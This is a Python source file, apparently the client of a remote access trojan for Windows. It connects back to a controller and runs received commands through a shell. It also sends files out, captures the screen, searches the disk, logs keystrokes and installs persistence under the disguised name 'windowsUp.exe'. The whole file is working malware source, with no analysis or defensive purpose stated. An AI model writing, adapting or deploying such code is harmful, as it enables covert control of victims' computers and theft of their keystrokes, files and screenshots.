# -*- coding: utf-8 -*-
"""
Spyder Editor

This is a temporary script file.
"""

import socket 
import subprocess
import sys
import os 
import shutil

import winreg as wreg  
import psutil
import time
import tempfile
import datetime
import platform
import random

from PIL import ImageGrab

sys.path.append("dependencies/")
import communicator
import keylog
import cpuinfo 
import persistance



class clientServerExchanger:
    def __init__(self , port= 4242 , ip = "127.0.0.1" ):
        self.port = port 
        self.ip = ip 
        self.socket = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        self.communicator = None
        self.command = "" 
        self.path = os.getcwd().replace("\\" , "/").strip("\n")
        self.programName = "windowsUp.exe"
        
        self.keyloger = keylog.keylogger()
        self.persistance = None
        
    def clientInitialize(self):
        
        print("[*] Trying to connect to -> " , self.ip ," on port -> " , self.port )
        self.socket.connect((self.ip , self.port))
        print("[+] Succesfully connected to the server")
        self.communicator = communicator.communicator(self.socket)
        self.mainHandler()
        
        
    def mainHandler(self):
        
        while True:
            self.command = self.communicator.receive()
            
            print(self.command)
            
            if 'terminate' in self.command :
                self.closeClient()
                break 
            elif 'grab' in self.command :
                self.transfer(self.command)
            
            elif 'cd' in self.command :
                self.changeDir(self.command)
            
            elif 'screencap' in self.command:
                self.screenShot()
            
            elif "info" in self.command :
                self.getInfo()
            
            elif 'persistance' in self.command:
                self.persistance(self.command)
            
            elif 'search' in self.command:
                self.searchFilesWithExt(self.command)
            
            elif 'keylog' in self.command:
                self.keylog(self.command)
            
       
            else:
                CMD = subprocess.Popen(self.command , shell=True , stdout=subprocess.PIPE , stderr=subprocess.PIPE ) 
                to_return = (CMD.stdout.read() + CMD.stderr.read()).decode("ISO-8859-1")
                print(to_return)
                if to_return == '':    
                    self.communicator.send( "Done")
                else:
                    self.communicator.send(to_return)
                
                
    def closeClient(self):
        self.socket.close()
        
        
    def changeDir(self,command):
        com , path = command.split(" ")
        if os.path.isdir(path):
            self.communicator.send("Directory->" + path + " Exist")
            os.chdir(path)
                
        else:
            self.communicator.send("Unable to find the directory")
            return
        
        #os.chdir(os.getcwd() + "/"+path)
        
        
        
    def transfer(self , command):
        grab , path = command.split("*")
        
        if os.path.exists(path):
            self.communicator.send("Exist")
        else:
            self.communicator.send("Unable to find the file")
            return 0
        
        
        f = open(path , "rb")
        
        totalSize = os.path.getsize(path)
        sizeSended = 0 
        
        while(1):
            data = f.read(1024)
            self.communicator.sendBytes(data)
            sizeSended+=len(data)
            print(len(data))
            print("Sended ->" , sizeSended/totalSize*100 )
            
            if (len(data) < 1024 ):
                break 
        f.close()
        
    
    
    def screenShot(self):
        
        dirpath = tempfile.mkdtemp()
        try :     
            path = dirpath+ "\\img.jpg"
            ImageGrab.grab().save(path, "JPEG")
            self.communicator.send(datetime.datetime.now().strftime('%m_%d_%Y-%H_%M_%S'))
            print(path)
            self.transfer("grab*"+path)
            
        except Exception as e :
            self.communicator.send("[-] An Error appened during the capture -> " , e )
            
    def searchFilesWithExt(self , command):
        command = command[7:].replace("\\" , "/")
        
        path , ext = command.split("*")
        lst = '' 
        
        for dirpath , dirname , files in os.walk(path):
            for file in files :
                if file.endswith(ext):
                    lst = lst + "\n" + os.path.join(dirpath , file)
        self.communicator.send(lst)
        
        
    def getInfo(self):
        cpu_percent ="Cpu utlisation -> " + str(psutil.cpu_percent())+ "%"
        cpu_cores =  "Cpu Cores      -> " + str(psutil.cpu_count()) 
        cpu_freq =   "Cpu Frequency  -> " + str(psutil.cpu_freq()[0]/1000) + " Ghz "
        cpu_name =   "Cpu name       -> " + str(cpuinfo.cpu.info[0]["ProcessorNameString"])
        
        
        
        memory_count = "Memory ammount -> " + str(psutil.virtual_memory()[0]/(1024*1000000)) + " GB"
        memory_usage = "Memory Usage   -> " + str(psutil.virtual_memory()[2]) + " %"
        
        currentWorkingDir = "Current Dir    -> " + str(os.getcwd().replace("\\" ,"/"))
        
        osInfo = platform.uname()
        
        pcName = "Pc name         -> " + str(osInfo[1])
        
        osName = "Os Info         ->  " + str(osInfo[0]) + str(osInfo[2]) + "  " + str(osInfo[3]) + " <> " + str(osInfo[4])
        pythonVersion = "Python Version -> " +  str(sys.version) 
        
        pythonExecutableDir = "Exec path         -> " + str(os.path.realpath(os.path.dirname(sys.argv[0]))) 
        
        to_return = cpu_name + "\n"\
                + cpu_cores + "\n"\
                + cpu_freq + "\n"\
                + cpu_percent + "\n"\
                + "#############################" + "\n"\
                + memory_count + "\n"\
                + memory_usage + "\n"\
                + "#############################" + "\n"\
                + pcName + "\n"\
                + osName + "\n"\
                + pythonVersion + "\n"\
                + pythonExecutableDir + "\n"\
                + currentWorkingDir + "\n"\

                
        self.communicator.send(to_return)
       
        
    def persistance(self , command):
        if not "win" in sys.platform:
            self.communicator.send("[-] Not windows platform can't setup persistance" )
            return
        
        if self.persistance == None :     
               self.persistance = persistance.persistance(self.programPath , self.programName)

                   
        if "install" in command : 
            self.communicator.send(self.persistance.installPersistance())
        
        elif "remove" in command:
            self.communicator.send(self.persistance.removePersistance())
        
        else:
            self.communicator.send("Command not understand")
        
    def keylog(self, command):
        
        if "start" in command :
            if not self.keyloger.isAlive():
                self.keyloger.startKeyLog()
                self.communicator.send("[+] Keylog started" )
            else:
                self.communicator.send("[-] Keyboard already running")
        
        elif "getlog" in command:
            print("GetLog")
            self.communicator.send(self.keyloger.getLog())
       
        elif "stop" in command:
            if self.keyloger.isAlive():    
                self.keyloger.stopKeyLog()
                self.communicator.send("[+] Keylog Stopped")
            else:
                self.communicator.send("[-] Keylog is not started")
    
    def stopProcess(self):
        
        if self.keyloger.isAlive():
            self.keyloger.stopKeyLog()
            
       
if __name__ == "__main__":
  
    print(sys.argv[0])
    if(len(sys.argv) > 1):     
        port = int(sys.argv[1])
    else:
        port = 4242 
            
    while True : 
        try :
            c = clientServerExchanger(port) 
            c.clientInitialize()
        except Exception as e :
            c.closeClient()
            c.stopProcess()
            print("[-] Can't connect -> ", e )
            time.sleep(random.randint(1,10))
            
            